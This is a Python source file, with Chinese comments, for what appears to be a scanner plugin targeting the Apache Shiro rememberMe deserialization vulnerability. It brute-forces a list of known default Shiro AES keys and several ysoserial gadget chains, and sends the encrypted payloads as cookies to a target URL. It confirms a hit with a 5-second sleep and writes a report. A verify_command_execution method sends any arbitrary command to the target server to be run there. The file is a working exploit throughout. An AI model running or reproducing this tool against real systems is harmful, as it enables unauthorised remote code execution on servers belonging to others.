import base64
import uuid
import subprocess
import requests
import os
from Crypto.Cipher import AES
import time
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

class ShiroDeserializeVuln:
    name = "Apache Shiro 反序列化漏洞"
    group = "Web"
    
    def __init__(self, key_file="key.txt", proxies=None):
        self.cmd_sleep = 'sleep-5'
        self.ysoserial = 'ysoserial-sleep.jar'
        self.gadget_list = [
            "CommonsBeanutils1",
            "CommonsCollectionsK1",
            "CommonsCollectionsK2",
            "JBossInterceptors1",
            "C3P0"
        ]
        
        # 初始密钥列表
        self.key_list = [
            "kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==",
            "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==",
            "fCq+/xW488hMTCD+cmJ3aQ=="
        ]
        
        # 添加GCM模式支持
        self.modes = ['CBC', 'GCM']  # 支持的加密模式
        
        self.headers = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        self.timeout = 10
        self.proxies = proxies or {'http': None, 'https': None}
        self.payload_cache = {}
        self.vulnerable_configs = []
        self.base_latency = 0.5

        # 优化文件路径处理
        self._load_keys_from_file(key_file)

    def _load_keys_from_file(self, key_file):
        """从文件加载密钥，处理路径问题"""
        try:
            # 解析绝对路径
            abs_path = os.path.abspath(key_file)
            
            if not os.path.exists(abs_path):
                print(f"[!] 密钥文件不存在: {abs_path}")
                return
            
            with open(abs_path, 'r', encoding='utf-8', errors='ignore') as f:
                file_keys = []
                for line in f:
                    # 清理行内容并跳过空行
                    cleaned = line.strip()
                    if cleaned:
                        file_keys.append(cleaned)
                
                # 合并并去重（保留顺序）
                combined = self.key_list + file_keys
                seen = set()
                self.key_list = [k for k in combined if not (k in seen or seen.add(k))]
                
                print(f"[*] 已加载 {len(file_keys)} 个密钥，共 {len(self.key_list)} 个唯一密钥")
        
        except Exception as e:
            print(f"[!] 加载密钥文件失败: {str(e)}")
            # 保留默认密钥列表

    def _test_single_config(self, key, gadget, mode, index, total_keys):
        """测试单个密钥/模式组合"""
        print(f"[*] 测试 ({index+1}/{total_keys}): gadget={gadget}, key={key[:20]}..., mode={mode}")
        payload = self.generate_payload(gadget, key, mode)
        if payload == "invalid_payload":
            return False

        start_time = time.time()
        try:
            response = requests.get(
                self.target,
                headers=self.headers,
                cookies={'rememberMe': payload},
                timeout=self.timeout,
                verify=False,
                proxies=self.proxies
            )
        except requests.RequestException as e:
            print(f"[!] 请求失败: {str(e)}")
            return False
        
        elapsed = time.time() - start_time
        if elapsed >= 5:
            print(f"[+] 存在漏洞! gadget={gadget}, key={key}, mode={mode}")
            # 记录成功配置
            self.vulnerable_configs.append({
                'key': key,
                'gadget': gadget,
                'mode': mode,
                'response_time': elapsed
            })
            return True
        return False

    def check(self, target):
        """检测目标是否存在漏洞（多线程版）"""
        print(f"[*] 开始检测: {target}")
        self.target = target
        self.vulnerable_configs = []  # 重置结果
        
        try:
            # 基准延迟测试
            try:
                start = time.time()
                requests.get(target, timeout=5, verify=False, proxies=self.proxies)
                self.base_latency = time.time() - start
                print(f"[*] 基准延迟: {self.base_latency:.2f}s")
            except Exception as e:
                print(f"[!] 基准延迟测试失败: {str(e)}")
                self.base_latency = 0.5
            
            # 设置检测超时（基准延迟+额外缓冲）
            self.timeout = max(10, self.base_latency * 2 + 5)
            print(f"[*] 设置检测超时为: {self.timeout:.2f}s")
            
            total_keys = len(self.key_list)
            total_tasks = total_keys * len(self.gadget_list) * len(self.modes)
            print(f"[*] 共需测试 {total_tasks} 个配置组合")
            
            found = False
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                
                for i, key in enumerate(self.key_list):
                    for gadget in self.gadget_list:
                        for mode in self.modes:
                            futures.append(
                                executor.submit(
                                    self._test_single_config,
                                    key, gadget, mode, i, total_keys
                                )
                            )
                
                # 检查结果
                for future in concurrent.futures.as_completed(futures):
                    if future.result():
                        found = True
                        # 不立即退出，继续收集所有漏洞配置
                        # executor.shutdown(wait=False)
                        # return True
            
            if found:
                print("[+] 漏洞检测完成，发现存在漏洞的配置")
                return True
            else:
                print("[-] 未发现漏洞")
                return False
        
        except Exception as e:
            print(f"[!] 检测过程中出错: {str(e)}")
            return False

    def generate_payload(self, gadget, key, mode='CBC'):
        """生成Shiro反序列化payload，支持CBC和GCM模式（带缓存）"""
        cache_key = f"{gadget}-{key}-{mode}"
        if cache_key in self.payload_cache:
            return self.payload_cache[cache_key]
            
        try:
            # 检查密钥长度并填充
            if len(key) % 4 != 0:
                key += '=' * (4 - len(key) % 4)
            
            try:
                key_bytes = base64.b64decode(key)
            except Exception as e:
                print(f"[!] 密钥base64解码失败: {str(e)}")
                return "invalid_payload"
            
            # 执行ysoserial生成payload
            process = subprocess.Popen(
                ['java', '-jar', self.ysoserial, gadget, self.cmd_sleep],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            stdout, stderr = process.communicate()
            
            if process.returncode != 0:
                print(f"[!] ysoserial执行失败: {stderr.decode(errors='ignore')}")
                return "invalid_payload"
            
            # 根据模式选择加密方式
            if mode == 'CBC':
                # CBC模式加密
                BS = AES.block_size
                pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                iv = os.urandom(16)
                cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
                encrypted = cipher.encrypt(pad(stdout))
                payload = iv + encrypted
            elif mode == 'GCM':
                # GCM模式加密
                nonce = os.urandom(16)
                cipher = AES.new(key_bytes, AES.MODE_GCM, nonce=nonce)
                encrypted, tag = cipher.encrypt_and_digest(stdout)
                payload = nonce + encrypted + tag
            else:
                print(f"[!] 不支持的加密模式: {mode}")
                return "invalid_payload"
            
            result = base64.b64encode(payload).decode()
            self.payload_cache[cache_key] = result
            return result
        
        except Exception as e:
            print(f"[!] 生成payload失败: {str(e)}")
            return "invalid_payload"
    
    def generate_report(self, filename="shiro_report.txt"):
        """生成漏洞报告"""
        if not self.vulnerable_configs:
            print("[-] 未发现漏洞，无报告生成")
            return
        
        with open(filename, 'w') as f:
            f.write("="*60 + "\n")
            f.write("Apache Shiro 反序列化漏洞检测报告\n")
            f.write("="*60 + "\n\n")
            f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"目标URL: {self.target}\n")
            f.write(f"测试密钥数: {len(self.key_list)}\n")
            f.write(f"测试Gadget数: {len(self.gadget_list)}\n")
            f.write(f"测试模式: {', '.join(self.modes)}\n")
            f.write("\n发现的漏洞配置:\n")
            f.write("-"*60 + "\n")
            
            for i, config in enumerate(self.vulnerable_configs, 1):
                f.write(f"配置 {i}:\n")
                f.write(f"  加密密钥: {config['key']}\n")
                f.write(f"  利用链: {config['gadget']}\n")
                f.write(f"  加密模式: {config['mode']}\n")
                f.write(f"  响应延迟: {config['response_time']:.2f}秒\n")
                f.write("-"*60 + "\n")
        
        print(f"[+] 报告已生成: {filename}")
    
    def verify_command_execution(self, key, gadget, mode, command):
        """验证命令执行能力"""
        print(f"[*] 验证命令执行: {command}")
        try:
            # 保存原始命令
            original_cmd = self.cmd_sleep
            
            # 生成特殊payload
            self.cmd_sleep = command
            payload = self.generate_payload(gadget, key, mode)
            
            # 恢复原始命令
            self.cmd_sleep = original_cmd
            
            if payload == "invalid_payload":
                return False
            
            try:
                start_time = time.time()
                requests.get(
                    self.target,
                    headers=self.headers,
                    cookies={'rememberMe': payload},
                    timeout=self.timeout,
                    verify=False,
                    proxies=self.proxies
                )
                # 这里需要根据命令特性判断执行结果
                # 例如使用dnslog或http请求验证
                print("[+] 命令执行请求已发送，请验证执行结果")
                return True
            except Exception as e:
                print(f"[!] 请求执行失败: {str(e)}")
                return False
        except Exception as e:
            print(f"[!] 验证失败: {str(e)}")
            return False